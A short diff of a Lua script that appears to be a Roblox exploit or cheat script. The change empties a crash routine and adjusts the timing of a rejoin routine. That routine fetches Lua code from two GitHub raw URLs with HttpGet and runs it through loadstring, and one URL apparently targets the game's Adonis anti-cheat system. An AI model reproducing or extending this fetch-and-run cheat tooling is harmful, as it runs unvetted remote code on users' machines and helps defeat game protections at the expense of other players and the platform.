@@ -2,12 +2,6 @@ local genv = getgenv()
 local fenv = getfenv()
 
 local function _crash()
-    task.spawn(function()
-        while true do 
-            task.wait(0.1)
-            pcall(function() local a = {}; table.insert(a, a) end) 
-        end
-    end)
 end
 
 local function verifyFunction(func)
@@ -129,11 +123,11 @@ local function RejoinServer()
             if not game:IsLoaded() then
                 game.Loaded:Wait()
             end
-            task.wait(1.5)
+            task.wait(5)
             pcall(function() 
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/LynX99-9/komtolmmek2/refs/heads/main/Adonis"))() 
             end)
-            task.wait(1.5)
+            task.wait(2)
             pcall(function() 
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/luxxidroblox-code/myscript.lua/refs/heads/main/dds.lua"))() 
             end)
